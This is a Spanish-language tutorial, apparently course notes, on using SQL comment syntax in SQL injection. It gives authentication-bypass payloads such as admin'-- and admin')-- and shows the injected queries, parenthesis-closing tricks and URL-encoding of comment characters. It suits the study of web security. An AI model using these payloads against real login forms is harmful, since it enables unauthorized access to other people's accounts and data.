 Uso de Comentarios en Inyección SQL

---

### **Introducción a Comentarios en SQL**

En SQL, los comentarios se utilizan para documentar consultas o ignorar partes de una consulta. Esto puede ser aprovechado en inyecciones SQL para alterar o eliminar partes de una consulta original, modificando su lógica.

#### **Tipos de Comentarios en MySQL**

1. **Comentarios con `--`**:
    
    - Ignoran todo el texto después de `--` en la misma línea.
    - **Requisito**: Debe haber un espacio después de `--` (`--` ).
    - **Ejemplo**:
        
        ```sql
        SELECT username FROM logins; -- Selecciona nombres de usuario
        ```
        
2. **Comentarios con `#`**:
    
    - Funcionan igual que `--` pero no requieren un espacio.
    - **Ejemplo**:
        
        ```sql
        SELECT * FROM logins WHERE username='admin'; # Ignora el resto
        ```
        
3. **Comentarios en línea (`/* */`)**:
    
    - Ignoran el texto entre `/*` y `*/`.
    - Raramente utilizados en inyecciones SQL.

---

### **Uso de Comentarios en Inyección SQL**

#### **Bypass de Autenticación**

Cuando una aplicación utiliza una consulta similar a esta:

```sql
SELECT * FROM logins WHERE username='admin' AND password='password';
```

Podemos usar comentarios para ignorar la cláusula `AND password` y hacer que la consulta solo verifique el `username`. Por ejemplo:

1. **Payload en el campo `username`**:
    
    ```sql
    admin'-- 
    ```
    
2. **Consulta resultante**:
    
    ```sql
    SELECT * FROM logins WHERE username='admin'-- AND password='password';
    ```
    
3. **Efecto**:
    
    - Se ignora la cláusula `AND password='password'`.
    - La consulta valida únicamente el `username`, permitiendo el acceso.

---

#### **Comentarios en el Navegador**

Cuando se utiliza el símbolo `#` en una URL, el navegador lo interpreta como un **ancla (tag)** y no lo envía al servidor. Para usarlo como comentario en una URL:

- Codificarlo como `%23`.
- Ejemplo:
    
    ```sql
    SELECT * FROM logins WHERE username='admin'%23 AND password='password';
    ```
    

---

### **Ejemplo Completo: Comentarios con Paréntesis**

Algunas consultas pueden utilizar paréntesis para establecer condiciones específicas. Los paréntesis tienen prioridad en la evaluación, lo que puede dificultar la inyección.

#### **Escenario con Paréntesis**

1. **Consulta original**:
    
    ```sql
    SELECT * FROM logins WHERE (username='admin') AND id > 1 AND password=MD5('password');
    ```
    
    - Condición: El `id` del usuario debe ser mayor a `1`.
    - El campo `password` se convierte en un hash, impidiendo la inyección directa en ese campo.
2. **Problema**:
    
    - No se puede iniciar sesión como `admin` porque su `id` es `1`.
    - Inyectar directamente `admin'--` causa un error de sintaxis debido a los paréntesis.

#### **Solución: Cerrar Paréntesis**

Para evitar el error, cerramos el paréntesis antes del comentario:

- **Payload en `username`**:
    
    ```sql
    admin')-- 
    ```
    
- **Consulta resultante**:
    
    ```sql
    SELECT * FROM logins WHERE (username='admin')-- AND id > 1 AND password=MD5('password');
    ```
    
- **Efecto**:
    
    - Ignora las condiciones `AND id > 1` y `AND password=MD5('password')`.
    - La consulta devuelve la fila del usuario `admin`.

---

### **Casos Prácticos**

1. **Consulta original**:
    
    ```sql
    SELECT * FROM logins WHERE (username='admin') AND id > 1 AND password=MD5('password');
    ```
    
2. **Payload incorrecto**:
    
    ```sql
    admin'-- 
    ```
    
    - Resultado: Error de sintaxis (paréntesis desbalanceados).
3. **Payload correcto**:
    
    ```sql
    admin')-- 
    ```
    
    - Resultado: Se cierra el paréntesis y se ignora el resto de la consulta.

---

### **Consejos para Inyección con Comentarios**

1. **Usar el espacio obligatorio en `--`**:
    
    - `--` es necesario para iniciar el comentario. En URLs, se codifica como `--+`.
2. **Cerrar paréntesis correctamente**:
    
    - Si la consulta tiene paréntesis, asegúrate de cerrarlos para evitar errores de sintaxis.
3. **Combinar con operadores lógicos (`OR`, `AND`)**:
    
    - Los comentarios son efectivos cuando se combinan con lógica de inyección como:
        
        ```sql
        admin' OR '1'='1'-- 
        ```
        
4. **Probar diferentes tipos de comentarios**:
    
    - Usa `#` o `/* */` si `--` no funciona correctamente.

---

### **Resumen**

- Los comentarios en SQL (`--`, `#`) se pueden usar para ignorar partes de una consulta.
- En inyección SQL, permiten eliminar condiciones adicionales (`AND`, `OR`) y modificar la lógica de la consulta.
- Cuando hay paréntesis, ciérralos correctamente antes de agregar el comentario.
- Usa codificación URL para garantizar que los comentarios se interpreten correctamente en navegadores.